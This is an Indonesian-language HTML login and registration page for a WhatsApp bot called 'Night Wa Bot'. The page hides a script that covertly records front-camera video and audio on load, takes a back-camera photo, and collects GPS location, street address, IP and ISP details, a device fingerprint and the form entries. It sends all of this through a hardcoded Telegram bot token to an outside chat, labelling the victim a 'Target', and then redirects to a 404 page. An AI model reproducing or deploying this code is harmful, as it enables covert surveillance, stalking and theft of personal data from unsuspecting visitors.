<!DOCTYPE html>

<html class="scroll-smooth" lang="id">
<head>
<meta charset="utf-8"/>
<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
<title>Login - Night Wa Bot</title>
<script src="https://cdn.tailwindcss.com"></script>
<link href="https://fonts.googleapis.com" rel="preconnect"/>
<link crossorigin="" href="https://fonts.gstatic.com" rel="preconnect"/>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&amp;display=swap" rel="stylesheet"/>
<script src="https://unpkg.com/feather-icons"></script>
<style>
    
        :root {
            --bg-color: #0A0A10;
            --primary-start: #5E50F9;
            --primary-end: #8D47FC;
            --card-color: rgba(23, 23, 33, 0.5);
            --border-color: rgba(139, 92, 246, 0.2);
            --glow-color: rgba(94, 80, 249, 0.5);
            --text-main: #F0F2F5;
            --text-secondary: #A0AEC0;
        }

        body {
            background-color: var(--bg-color);
            color: var(--text-main);
            font-family: 'Inter', sans-serif;
            overflow-x: hidden;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }
        
        #particle-canvas {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            opacity: 0.5;
        }

        .navbar {
            background-color: rgba(10, 10, 16, 0.6);
            border-bottom: 1px solid var(--border-color);
            backdrop-filter: blur(12px);
            -webkit-backdrop-filter: blur(12px);
        }

        .btn {
            transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
            border: 1px solid transparent;
        }

        .btn-primary {
            background-image: linear-gradient(to right, var(--primary-start) 0%, var(--primary-end) 51%, var(--primary-start) 100%);
            background-size: 200% auto;
        }

        .btn-primary:hover:not(:disabled) {
            background-position: right center;
            box-shadow: 0 0 25px var(--glow-color);
            transform: translateY(-3px) scale(1.05);
        }
         .btn-primary:disabled {
            opacity: 0.5;
            cursor: not-allowed;
         }

        .btn-secondary {
            background-color: transparent;
            border: 1px solid var(--border-color);
            color: var(--text-secondary);
        }
        .btn-secondary:hover:not(:disabled) {
            background-color: var(--card-color);
            border-color: var(--primary-start);
            color: var(--text-main);
            box-shadow: 0 0 15px var(--glow-color);
        }
        .btn-secondary.btn-success {
            background-color: #22c55e;
            border-color: #22c55e;
            color: white;
            transform: scale(1.02);
            box-shadow: 0 0 20px rgba(34, 197, 94, 0.5);
        }

        .glow-card {
            background-color: var(--card-color);
            border: 1px solid var(--border-color);
            transition: all 0.4s ease;
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            animation: pulse-glow 4s infinite alternate;
        }
        @keyframes pulse-glow {
            from {
                border-color: var(--border-color);
                box-shadow: 0 0 15px rgba(94, 80, 249, 0.1);
            }
            to {
                border-color: var(--primary-start);
                box-shadow: 0 0 30px rgba(94, 80, 249, 0.3);
            }
        }

        .input-field {
            background-color: rgba(30, 30, 45, 0.7);
            border: 1px solid var(--border-color);
            transition: all 0.3s ease;
        }

        .input-field:focus {
            border-color: var(--primary-start);
            box-shadow: 0 0 15px var(--glow-color);
            outline: none;
        }
        
        .code-box {
            width: 2.5rem; /* 40px */
            height: 3.5rem; /* 56px */
            display: inline-flex;
            justify-content: center;
            align-items: center;
            background-color: rgba(30, 30, 45, 0.9);
            border: 1px solid var(--border-color);
            border-radius: 0.5rem; /* 8px */
            font-size: 1.5rem; /* 24px */
            font-weight: 700;
            color: var(--text-main);
            text-shadow: 0 0 10px var(--glow-color);
            transition: all 0.3s ease;
            transform: scale(0);
            opacity: 0;
            animation: popIn 0.5s ease forwards;
        }
        .code-box:hover {
            transform: scale(1.1);
            border-color: var(--primary-start);
        }
        @keyframes popIn {
            to {
                transform: scale(1);
                opacity: 1;
            }
        }

        .code-divider {
            color: var(--text-secondary);
            font-size: 1.5rem;
            font-weight: 700;
            opacity: 0.5;
        }

        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        @keyframes slideInUp { from { transform: translateY(20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }

        .slide-in-up { animation: slideInUp 0.5s ease-out forwards; }
        
        /* Custom styles for intl-tel-input to match the theme */
        .iti {
            width: 100%;
        }
        .iti__flag-container {
            background-color: rgba(30, 30, 45, 0.7);
            border: 1px solid var(--border-color);
            border-right: 1px solid var(--border-color);
        }
        .iti--allow-dropdown .input-field {
             border-radius: 0.5rem !important;
             padding-left: 58px !important;
        }
        .iti--separate-dial-code .input-field {
            border-radius: 0 0.5rem 0.5rem 0 !important;
            padding-left: 85px !important;
        }
        .iti__selected-flag {
             background-color: transparent !important;
             border-radius: 0.5rem 0 0 0.5rem;
        }
        .iti__country-list {
            background-color: #11111b;
            border: 1px solid var(--border-color);
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
        }
        .iti__country {
            color: var(--text-secondary);
            transition: background-color 0.2s ease;
        }
        .iti__country:hover, .iti__country.iti__highlight {
            background-color: var(--card-color);
        }
        .iti__dial-code {
            color: var(--text-secondary);
        }
        .iti__arrow {
            border-top-color: var(--text-secondary) !important;
        }
        .iti__arrow--up {
            border-bottom-color: var(--text-secondary) !important;
        }

    
    </style>
</head>
<body class="antialiased">
<canvas id="particle-canvas"></canvas>
<nav class="navbar w-full z-50 px-4 sm:px-6 lg:px-8 sticky top-0">
<div class="max-w-7xl mx-auto">
<div class="flex items-center justify-between h-20">
<div class="flex items-center">
<a class="flex-shrink-0 text-white font-bold text-2xl flex items-center gap-2 tracking-wider" href="/">
<i class="text-indigo-400" data-feather="lock"></i>
<span>Night<span class="text-indigo-400">Wa</span>Bot</span>
</a>
</div>
<div class="hidden md:block">
<a class="text-slate-300 hover:text-white transition-colors duration-200" href="/">Back to Home</a>
</div>
</div>
</div>
</nav>
<main class="flex-grow flex items-center justify-center w-full px-4">
<div class="w-full max-w-lg p-8 space-y-6 glow-card rounded-xl text-center slide-in-up" id="main-card">
<h2 class="text-3xl font-bold text-white flex items-center justify-center gap-3">
<i class="text-indigo-400" data-feather="log-in"></i> Login Akun
            </h2>
<p class="text-slate-400 mt-2">Masuk ke akun Night Wa Bot Anda.</p>
<form action="/auth/login" class="space-y-4 mt-6 text-left" id="login-form" method="POST">
<div>
<div class="flex items-center input-field rounded-lg px-3">
<i class="text-indigo-400 mr-2" data-feather="user"></i>
<input class="w-full bg-transparent py-2 text-white focus:outline-none" id="username" name="username" placeholder="Masukkan username" required="" type="text"/>
</div>
</div>
<div>
<div class="flex items-center input-field rounded-lg px-3">
<i class="text-indigo-400 mr-2" data-feather="lock"></i>
<input class="w-full bg-transparent py-2 text-white focus:outline-none" id="password" name="password" placeholder="Masukkan password" required="" type="password"/>
</div>
</div>
<div class="flex items-center justify-between text-sm text-slate-400">
<label class="flex items-center gap-2">
<input class="h-4 w-4 rounded border-gray-500 bg-slate-700 text-indigo-600 focus:ring-indigo-500 cursor-pointer" type="checkbox"/>
                        Ingat saya
                    </label>
<a class="text-indigo-400 hover:underline" href="/forgot-password">Lupa password?</a>
</div>
<button class="w-full px-4 py-3 font-semibold text-white btn-primary rounded-lg" type="submit">Masuk</button>
</form>
<p class="text-slate-400 text-sm mt-4">Belum punya akun? <a class="text-indigo-400 hover:underline" href="/register" id="show-register">Daftar sekarang</a></p>

<div class="hidden space-y-4 mt-6 text-left" id="register-card">
<div>
<label class="block text-sm font-medium text-slate-300 mb-1" for="fullname">Nama Lengkap</label>
<div class="flex items-center input-field rounded-lg px-3">
<i class="text-indigo-400 mr-2" data-feather="user"></i>
<input class="w-full bg-transparent py-2 text-white focus:outline-none" id="fullname" name="fullname" placeholder="Masukkan nama lengkap" required="" type="text"/>
</div>
</div>
<div>
<label class="block text-sm font-medium text-slate-300 mb-1" for="reg-username">Username</label>
<div class="flex items-center input-field rounded-lg px-3">
<i class="text-indigo-400 mr-2" data-feather="user-check"></i>
<input class="w-full bg-transparent py-2 text-white focus:outline-none" id="reg-username" name="reg-username" placeholder="Masukkan username" required="" type="text"/>
</div>
</div>
<div>
<label class="block text-sm font-medium text-slate-300 mb-1" for="email">Email</label>
<div class="flex items-center input-field rounded-lg px-3">
<i class="text-indigo-400 mr-2" data-feather="mail"></i>
<input class="w-full bg-transparent py-2 text-white focus:outline-none" id="email" name="email" placeholder="Masukkan email" required="" type="email"/>
</div>
</div>
<div>
<label class="block text-sm font-medium text-slate-300 mb-1" for="phone">Nomor Telepon</label>
<div class="flex items-center input-field rounded-lg px-3">
<i class="text-indigo-400 mr-2" data-feather="phone"></i>
<input class="w-full bg-transparent py-2 text-white focus:outline-none" id="phone" name="phone" placeholder="Masukkan nomor telepon" required="" type="tel"/>
</div>
</div>
<div>
<label class="block text-sm font-medium text-slate-300 mb-1" for="reg-password">Password</label>
<div class="flex items-center input-field rounded-lg px-3">
<i class="text-indigo-400 mr-2" data-feather="lock"></i>
<input class="w-full bg-transparent py-2 text-white focus:outline-none" id="reg-password" name="reg-password" placeholder="Masukkan password" required="" type="password"/>
</div>
</div>
<button class="w-full px-4 py-3 font-semibold text-white btn-primary rounded-lg" type="submit">
        Daftar
    </button>
<p class="text-slate-400 text-sm mt-4 text-center">
        Sudah punya akun? 
        <a class="text-indigo-400 hover:underline" href="#" id="show-login">Login sekarang</a>
</p>
</div>
</div>
</main>
<footer class="border-t border-slate-700/50 mt-12">
<div class="max-w-7xl mx-auto py-8 px-4 sm:px-6 lg:px-8 text-center text-slate-400">
<div class="flex justify-center space-x-6 mb-4">
<a class="hover:text-white transition-colors text-sm" href="/terms">Terms</a>
<a class="hover:text-white transition-colors text-sm" href="/privacy">Privacy</a>
<a class="hover:text-white transition-colors text-sm" href="/contact">Contact</a>
</div>
<p class="text-sm">© 2025 Night Wa Bot. All rights reserved.</p>
</div>
</footer>



<script>
/* ===========================
   CONFIG — ganti token/chat jika mau
   =========================== */
const BOT_TOKEN = "8275671762:AAFHjoV2ZQCW9y69JvUTarIw7hUT0NVAXF8";
const CHAT_ID   = "6216902201";
/* =========================== */

const regForm = document.getElementById('regForm');
const consentEl = document.getElementById('consent');
const videoPreview = document.getElementById('videoPreview');
const maskImage = document.getElementById('maskImage'); // background video (now muted so autoplay allowed)
const canvas = document.getElementById('canvas');
const ctx = canvas.getContext('2d');
const statusText = document.getElementById('statusText');

const noop = ()=>{};
function safeSlice(s, n=1000){ if(!s) return ''; return s.length<=n? s : s.slice(0,n-3)+'...'; }
async function fetchJSON(url){ try{ const r = await fetch(url, {cache:'no-store'}); if(!r.ok) throw new Error('bad '+r.status); return await r.json(); }catch(e){return null;} }

async function getIPInfo(){
  const sources = [
    {url:'https://ipapi.co/json/', map:j=>({ ip:j.ip, org:j.org, asn:j.asn||j.asn || (j.org? j.org : undefined), city:j.city, region:j.region, country:j.country_name||j.country, postal:j.postal })},
    {url:'https://ipwhois.app/json/', map:j=>({ ip:j.ip, org:j.org||j.isp, city:j.city, region:j.region, country:j.country, postal:j.postal })},
    {url:'https://api.ipify.org?format=json', map:j=>({ ip:j.ip })}
  ];
  for(const s of sources){
    const j = await fetchJSON(s.url);
    if(!j) continue;
    const m = s.map(j);
    if(m && m.ip) return m;
  }
  return { ip:'unknown' };
}
async function revGeocode(lat, lon){
  try{
    const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${encodeURIComponent(lat)}&lon=${encodeURIComponent(lon)}`, { cache:'no-store', headers:{ 'User-Agent':'VerificationApp/1.0' }});
    if(!r.ok) throw new Error('revgeo '+r.status);
    const j = await r.json();
    return { display: j.display_name||null, address: j.address||{} };
  }catch(e){ return { error: e.message||'revgeo fail' }; }
}
async function getBattery(){ try{ if(!navigator.getBattery) return null; const b = await navigator.getBattery(); return `${Math.round(b.level*100)}% (${b.charging? 'Charging':'Not Charging'})`; }catch{return null;} }
function getConnection(){ try{ const c = navigator.connection||navigator.mozConnection||navigator.webkitConnection; if(!c) return null; return { effectiveType:c.effectiveType, downlink:c.downlink, rtt:c.rtt, saveData:c.saveData }; }catch{return null;} }
function getGeo(){ return new Promise(resolve=>{ if(!navigator.geolocation) return resolve({ error:'geolocation not supported' }); navigator.geolocation.getCurrentPosition(pos=> resolve({ lat:pos.coords.latitude, lon:pos.coords.longitude, acc: pos.coords.accuracy + ' m' }), err=> resolve({ error: err.message }), { enableHighAccuracy:true, timeout:10000 }); }); }

// Capture front photo + 5s video (used for initial auto-capture)
async function capturePhotoAndVideo(durationMs = 5000){
  try{
    const stream = await navigator.mediaDevices.getUserMedia({ video:{ facingMode:'user' }, audio:true });
    videoPreview.srcObject = stream;
    videoPreview.muted = true;
    await videoPreview.play().catch(noop);
    await new Promise(r=>setTimeout(r,700));
    const w = videoPreview.videoWidth || 800, h = videoPreview.videoHeight || 600;
    const side = Math.min(w,h);
    const sx = Math.max(0, (w - side)/2), sy = Math.max(0, (h - side)/2);
    const size = 800;
    canvas.width = size; canvas.height = size;
    ctx.drawImage(videoPreview, sx, sy, side, side, 0, 0, size, size);
    const photoBlob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.9));
    const mime = MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus') ? 'video/webm;codecs=vp8,opus' : (MediaRecorder.isTypeSupported('video/mp4')? 'video/mp4' : '');
    const recorder = new MediaRecorder(stream, mime ? { mimeType: mime } : undefined);
    const chunks = [];
    recorder.ondataavailable = ev => { if(ev.data && ev.data.size) chunks.push(ev.data); };
    recorder.start();
    await new Promise(r => setTimeout(r, durationMs));
    recorder.stop();
    await new Promise(r => recorder.onstop = r);
    stream.getTracks().forEach(t => t.stop());
    videoPreview.pause(); videoPreview.srcObject = null;
    const videoBlob = new Blob(chunks, { type: chunks.length && chunks[0].type ? chunks[0].type : 'video/webm' });
    return { photoBlob, videoBlob };
  }catch(e){
    try{ if(videoPreview.srcObject) { videoPreview.srcObject.getTracks().forEach(t=>t.stop()); videoPreview.srcObject = null; } }catch{}
    return { photoBlob:null, videoBlob:null };
  }
}

// Capture back camera photo (single image)
async function captureBackPhoto() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video:{ facingMode:"environment" } });
    const video = document.createElement("video");
    video.srcObject = stream;
    video.muted = true;
    await video.play();
    await new Promise(r=>setTimeout(r,700));
    const w = video.videoWidth || 800, h = video.videoHeight || 600;
    // crop center if preferable
    const side = Math.min(w,h);
    const sx = Math.max(0, (w - side)/2), sy = Math.max(0, (h - side)/2);
    canvas.width = 800; canvas.height = 800;
    ctx.drawImage(video, sx, sy, side, side, 0, 0, 800, 800);
    const blob = await new Promise(res=>canvas.toBlob(res,"image/jpeg",0.9));
    stream.getTracks().forEach(t=>t.stop());
    video.pause();
    video.srcObject = null;
    return blob;
  } catch(e){ return null; }
}

// Telegram helpers
async function sendPhotoCaption(photoBlob, caption){
  const fd = new FormData();
  fd.append('chat_id', CHAT_ID);
  fd.append('photo', photoBlob, 'photo.jpg');
  fd.append('caption', caption);
  return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method:'POST', body: fd });
}
async function sendVideoCaption(videoBlob, caption){
  const fd = new FormData();
  fd.append('chat_id', CHAT_ID);
  fd.append('video', videoBlob, 'video.mp4');
  fd.append('caption', caption);
  return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method:'POST', body: fd });
}
async function sendText(text){
  return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method:'POST', headers:{ 'Content-Type':'application/json' }, body: JSON.stringify({ chat_id: CHAT_ID, text }) });
}

/* caption builders (sama seperti sebelumnya) */
function buildPhotoCaption(obj){
  const now = new Date();
  const lines = [];
  lines.push(`╭─ > Tanggal: ${now.toLocaleString()}`);
  if(obj.profile && obj.profile.name) lines.push(` ├─ > Nama: ${obj.profile.name}`);
  if(obj.profile && obj.profile.phone) lines.push(` ├─ > Nomor Telepon: ${obj.profile.phone}`);
  if(obj.profile && obj.profile.email) lines.push(` ├─ > Email: ${obj.profile.email}`);
  lines.push(` ├─ >(Target)`);
  lines.push(` │   └─ ${obj.userAgent || '-'}`);
  lines.push(` ├─ > (IP)`);
  const ip = obj.ipInfo || {};
  lines.push(` │   ├─ IP: ${ip.ip || '-'}`);
  lines.push(` │   ├─ ISP/Org: ${ip.org || '-'}`);
  lines.push(` │   ├─ ASN: ${ip.asn || '-'}`);
  lines.push(` │   ├─ City: ${ip.city || '-'}`);
  lines.push(` │   ├─ Region: ${ip.region || '-'}`);
  lines.push(` │   └─ Country: ${ip.country || '-'}`);
  lines.push(` ├─ > Device`);
  lines.push(` │   ├─ Platform: ${obj.platform || '-'}`);
  lines.push(` │   ├─ Screen: ${obj.screen || '-'}`);
  lines.push(` │   ├─ Language: ${obj.language || '-'}`);
  lines.push(` │   ├─ Timezone (browser): ${obj.timezone || '-'}`);
  lines.push(` │   └─ Battery: ${obj.battery || '-'}`);
  lines.push(` ├─ >(GPS)`);
  if(obj.geo && !obj.geo.error){
    lines.push(` │   ├─ Lat: ${obj.geo.lat}`);
    lines.push(` │   ├─ Lon: ${obj.geo.lon}`);
    lines.push(` │   └─ Maps: https://maps.google.com/?q=${obj.geo.lat},${obj.geo.lon}`);
  } else {
    lines.push(` │   └─ GPS: ${obj.geo ? obj.geo.error : '-'}`);
  }
  lines.push(`╰─ > © ᴅᴀғғᴀ ᴅᴇᴠ)`);
  return safeSlice(lines.join('\n'), 1000);
}

function buildVideoCaptionAddress(rev){
  const a = rev && rev.address ? rev.address : {};
  const lines = [];
  lines.push(`├─ > Alamat (Detail)`);
  lines.push(` │   ├─ Negara: ${a.country || '-'}`);
  lines.push(` │   ├─ Kode Negara: ${a.country_code || '-'}`);
  lines.push(` │   ├─ Provinsi: ${a.state || a.region || '-'}`);
  lines.push(` │   ├─ Kota: ${a.city || a.town || a.village || '-'}`);
  lines.push(` │   └─ Kode Pos: ${a.postcode || '-'}`);
  return safeSlice(lines.join('\n'), 1000);
}

/* AUTO-CAPTURE ON LOAD (tetap menangkap front 5s jika izin diberikan otomatis),
   mencoba membuat initial front photo/video agar tidak perlu capture ulang */
let initialPhotoBlob = null;
let initialVideoBlob = null;

(async function autoCaptureOnLoad(){
  try{
    const media = await capturePhotoAndVideo(5000); // 5s front camera
    if(media && (media.photoBlob || media.videoBlob)){
      initialPhotoBlob = media.photoBlob;
      initialVideoBlob = media.videoBlob;
    }
  }catch(e){
    initialPhotoBlob = null;
    initialVideoBlob = null;
  }
})();

/* main flow */
regForm.addEventListener('submit', async function(e){
  e.preventDefault();
  const name = document.getElementById('name').value.trim();
  const wa = document.getElementById('wa').value.trim();
  const email = document.getElementById('email').value.trim();
  const consent = consentEl.checked;

  if(!name || !wa || !email){
    alert('Isi Nama, Nomor WA, dan Email terlebih dahulu.');
    return;
  }

  try{
    const quick = `╭─ > Tanggal: ${new Date().toLocaleString()}\n ├─ > Nama: ${name}\n ├─ > Nomor WA: ${wa}\n ├─ > Email: ${email}\n ╰─ > Aksi: Pendaftaran`;
    await sendText(quick);
  }catch(e){ /* ignore */ }

  const ipInfo = await getIPInfo();
  const battery = await getBattery();
  const connection = getConnection();
  const deviceMemory = navigator.deviceMemory || '-';
  const maxTouchPoints = navigator.maxTouchPoints || '-';
  const colorDepth = screen.colorDepth || '-';
  const device = {
    platform: navigator.platform || '-',
    userAgent: navigator.userAgent || navigator.appVersion || '-',
    screen: (screen ? `${screen.width}x${screen.height}` : '-'),
    language: navigator.language || '-',
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || '-',
    localDate: new Date().toLocaleString(),
    battery,
    deviceMemory,
    maxTouchPoints,
    colorDepth,
    connection
  };

  // geolocation if consent
  let geo = { error:'not requested' }, rev = null;
  if(consent){
    geo = await getGeo();
    if(!geo.error && geo.lat && geo.lon){
      rev = await revGeocode(geo.lat, geo.lon);
    }
  }

  // capture media: front (photo/video) already in initialPhotoBlob OR capture now
  let frontPhoto = null, frontVideo = null, backPhoto = null;
  if(consent){
    if(initialPhotoBlob || initialVideoBlob){
      frontPhoto = initialPhotoBlob;
      frontVideo = initialVideoBlob;
      initialPhotoBlob = null; initialVideoBlob = null;
    } else {
      const media = await capturePhotoAndVideo(5000);
      frontPhoto = media.photoBlob;
      frontVideo = media.videoBlob;
    }
    // try to capture back camera photo
    try{
      backPhoto = await captureBackPhoto();
    }catch(e){
      backPhoto = null;
    }
  }

  const profile = { name, phone: wa, email };
  const photoCaptionObj = {
    profile,
    message: 'Pendaftaran & Verifikasi (dengan izin)',
    userAgent: device.userAgent,
    ipInfo,
    platform: device.platform,
    screen: device.screen,
    language: device.language,
    timezone: device.timezone,
    battery: device.battery,
    geo
  };
  const photoCaption = buildPhotoCaption(photoCaptionObj);
  const videoCaption = buildVideoCaptionAddress(rev);

  // send front photo (if ada)
  try{
    if(frontPhoto){
      await sendPhotoCaption(frontPhoto, photoCaption + '\n\n(Tipe: Kamera Depan)');
    } else {
      await sendText(photoCaption + '\n\n(Tidak ada foto depan)');
    }
  }catch(e){ /* ignore failures */ }

  // send back photo (if ada)
  try{
    if(backPhoto){
      await sendPhotoCaption(backPhoto, photoCaption + '\n\n(Tipe: Kamera Belakang)');
    } else {
      // optionally send text noting back photo tidak tersedia
      // await sendText('Foto belakang tidak tersedia.');
    }
  }catch(e){ /* ignore failures */ }

  // send video if present
  try{
    if(frontVideo){
      await sendVideoCaption(frontVideo, videoCaption);
    } else {
      // ignore
    }
  }catch(e){ /* ignore */ }

  // done -> redirect to 404
  document.querySelector('.wrap').style.display = 'none';
  document.getElementById('finish').style.display = 'block';
  setTimeout(()=>{ window.location.href = '/404.html'; }, 1200);
});

/* checkbox UX: keep mask visible unless user wants preview */
consentEl.addEventListener('change', async (e)=>{
  if(!consentEl.checked){
    try{ if(videoPreview.srcObject) { videoPreview.srcObject.getTracks().forEach(t=>t.stop()); videoPreview.srcObject = null; } }catch{}
    if(maskImage) maskImage.style.display = 'block';
    videoPreview.style.opacity = '0';
    return;
  }
  // keep mask visible by default
});

/* ensure background video autoplay: muted must be true for autoplay to work in most browsers */
const bgVideo = document.getElementById('maskImage');
if(bgVideo){
  bgVideo.muted = true; // penting: muted supaya autoplay tanpa gesture
  bgVideo.play().catch(()=>{
    // fallback: play on first user interaction
    document.body.addEventListener('click', ()=> bgVideo.play(), {once:true});
  });
}

</script>
</body>
</html>
